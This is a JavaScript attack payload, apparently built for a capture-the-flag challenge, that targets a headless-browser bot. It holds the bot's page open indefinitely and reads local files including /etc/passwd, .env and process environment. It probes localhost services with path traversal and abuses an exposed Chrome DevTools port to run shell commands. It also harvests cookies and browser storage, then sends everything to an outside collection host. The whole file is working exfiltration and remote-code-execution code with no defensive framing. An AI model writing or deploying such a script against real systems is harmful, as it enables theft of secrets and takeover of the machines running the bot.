(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // UTILITY - Send data as readable text
    // =================================================================
    
    function send(endpoint, data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/' + endpoint, true);
        xhr.setRequestHeader('Content-Type', 'text/plain');
        xhr.send(data); // Send as plain text, not base64!
    }
    
    function log(msg) {
        send('log', '[' + new Date().toISOString() + '] ' + msg);
        console.log('[EXFIL]', msg);
    }
    
    // =================================================================
    // HOLD THE BOT - Keep page loading forever
    // =================================================================
    
    function holdBot() {
        log('Adding hanging resources to hold bot...');
        
        for (let i = 0; i < 3; i++) {
            const script = document.createElement('script');
            script.src = 'https://httpstat.us/200?sleep=999999&t=js' + i;
            document.head.appendChild(script);
        }
        
        log('Bot is now HELD - page.goto() will never resolve');
    }
    
    holdBot();
    
    // =================================================================
    // 1. READ LOCAL FILES (if file:// works)
    // =================================================================
    
    function tryReadFile(path, name) {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', path, false); // Synchronous
            xhr.send();
            
            if ((xhr.status === 200 || xhr.status === 0) && xhr.responseText) {
                const content = xhr.responseText;
                
                // Send as readable text with clear headers
                const output = `
========================================
FILE: ${name}
PATH: ${path}
SIZE: ${content.length} bytes
========================================
${content}
========================================
`;
                send('file-' + name, output);
                log('✓ Read file: ' + name + ' (' + content.length + ' bytes)');
                return true;
            }
        } catch(e) {
            log('✗ Failed to read ' + name + ': ' + e.message);
        }
        return false;
    }
    
    log('Attempting to read local files...');
    
    const files = [
        ['file:///flag.txt', 'flag'],
        ['file:///app/flag.txt', 'app-flag'],
        ['file:///etc/passwd', 'passwd'],
        ['file:///etc/hostname', 'hostname'],
        ['file:///app/package.json', 'package'],
        ['file:///app/bot.js', 'bot'],
        ['file:///app/.env', 'dotenv'],
        ['file:///proc/self/environ', 'environ'],
        ['file:///proc/self/cmdline', 'cmdline']
    ];
    
    let fileCount = 0;
    files.forEach(([path, name]) => {
        if (tryReadFile(path, name)) fileCount++;
    });
    
    log('File reading complete: ' + fileCount + '/' + files.length + ' succeeded');
    
    // =================================================================
    // 2. ACCESS INTERNAL HTTP SERVICES
    // =================================================================
    
    function tryFetch(url, name) {
        fetch(url)
            .then(r => r.text())
            .then(data => {
                const output = `
========================================
SERVICE: ${name}
URL: ${url}
SIZE: ${data.length} bytes
========================================
${data}
========================================
`;
                send('service-' + name, output);
                log('✓ Fetched service: ' + name);
            })
            .catch(e => {
                log('✗ Service failed ' + name + ': ' + e.message);
            });
    }
    
    log('Attempting to access internal services...');
    
    setTimeout(() => {
        const services = [
            ['http://localhost:3000/api/quiz', 'quiz-api'],
            ['http://localhost:3000/static/../package.json', 'package-traversal'],
            ['http://localhost:3000/static/../bot.js', 'bot-traversal'],
            ['http://localhost:3000/static/../.env', 'env-traversal'],
            ['http://127.0.0.1:3000/', 'localhost-root']
        ];
        
        services.forEach(([url, name]) => tryFetch(url, name));
    }, 500);
    
    // =================================================================
    // 3. CHECK FOR CHROME DEVTOOLS PROTOCOL (CDP)
    // =================================================================
    
    function checkCDP() {
        log('Checking for Chrome DevTools Protocol...');
        
        const ports = [9222, 9223, 9224, 9229];
        
        ports.forEach(port => {
            fetch(`http://localhost:${port}/json`)
                .then(r => r.json())
                .then(data => {
                    const output = `
========================================
CDP FOUND!
PORT: ${port}
TABS: ${data.length}
========================================
${JSON.stringify(data, null, 2)}
========================================

WEBSOCKET URL: ${data[0]?.webSocketDebuggerUrl || 'N/A'}
`;
                    send('cdp-found-port-' + port, output);
                    log('✓ CDP FOUND on port ' + port + '!');
                    
                    // Try to exploit CDP
                    exploitCDP(port, data);
                })
                .catch(() => {
                    // Silent fail - port not open
                });
        });
    }
    
    setTimeout(checkCDP, 1000);
    
    // =================================================================
    // 4. EXPLOIT CDP FOR RCE (if available)
    // =================================================================
    
    function exploitCDP(port, tabs) {
        if (!tabs || tabs.length === 0) return;
        
        const wsUrl = tabs[0].webSocketDebuggerUrl;
        if (!wsUrl) return;
        
        log('Attempting CDP exploitation via WebSocket...');
        
        try {
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                log('✓ CDP WebSocket connected!');
                
                // Execute Node.js code to read files
                const commands = [
                    {
                        id: 1,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('/flag.txt', 'utf8')`
                        }
                    },
                    {
                        id: 2,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('/etc/passwd', 'utf8')`
                        }
                    },
                    {
                        id: 3,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('child_process').execSync('ls -la /app').toString()`
                        }
                    },
                    {
                        id: 4,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('child_process').execSync('whoami').toString()`
                        }
                    }
                ];
                
                commands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(JSON.stringify(cmd));
                        log('Sent CDP command #' + cmd.id);
                    }, i * 500);
                });
            };
            
            ws.onmessage = (event) => {
                const response = JSON.parse(event.data);
                
                if (response.result && response.result.result) {
                    const value = response.result.result.value;
                    const output = `
========================================
CDP RCE RESULT
COMMAND ID: ${response.id}
========================================
${value}
========================================
`;
                    send('cdp-rce-' + response.id, output);
                    log('✓ CDP RCE result received for command #' + response.id);
                }
            };
            
            ws.onerror = (e) => {
                log('✗ CDP WebSocket error: ' + e.message);
            };
            
        } catch(e) {
            log('✗ CDP exploitation failed: ' + e.message);
        }
    }
    
    // =================================================================
    // 5. COLLECT ENVIRONMENT INFO
    // =================================================================
    
    function collectEnvInfo() {
        const info = {
            url: window.location.href,
            origin: window.location.origin,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
        };
        
        // Get localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                info.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // Get sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                info.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        const output = `
========================================
ENVIRONMENT INFO
========================================
URL: ${info.url}
Origin: ${info.origin}
User Agent: ${info.userAgent}
Platform: ${info.platform}
Language: ${info.language}
Cookies: ${info.cookies || '(none)'}

LocalStorage:
${JSON.stringify(info.localStorage, null, 2)}

SessionStorage:
${JSON.stringify(info.sessionStorage, null, 2)}
========================================
`;
        send('environment', output);
        log('Environment info collected');
    }
    
    collectEnvInfo();
    
    // =================================================================
    // 6. HEARTBEAT (every 60 seconds, not spammy)
    // =================================================================
    
    let heartbeat = 0;
    setInterval(() => {
        heartbeat++;
        send('heartbeat', `Heartbeat #${heartbeat} - Bot still alive at ${new Date().toISOString()}`);
        log('Heartbeat #' + heartbeat);
    }, 60000); // 1 minute intervals
    
    // =================================================================
    // 7. SUMMARY REPORT
    // =================================================================
    
    setTimeout(() => {
        const summary = `
========================================
EXFILTRATION SUMMARY
========================================
Time: ${new Date().toISOString()}
Bot Status: HELD (page.goto() blocked)
Files Attempted: ${files.length}
Files Success: ${fileCount}

Next Steps:
- Check /file-* endpoints for file contents
- Check /service-* for HTTP services
- Check /cdp-* for RCE results
- Check /environment for env info

Bot will remain alive indefinitely.
========================================
`;
        send('summary', summary);
        log('Summary report sent');
    }, 5000);
    
    log('Exfiltration script initialized successfully');
    
})();
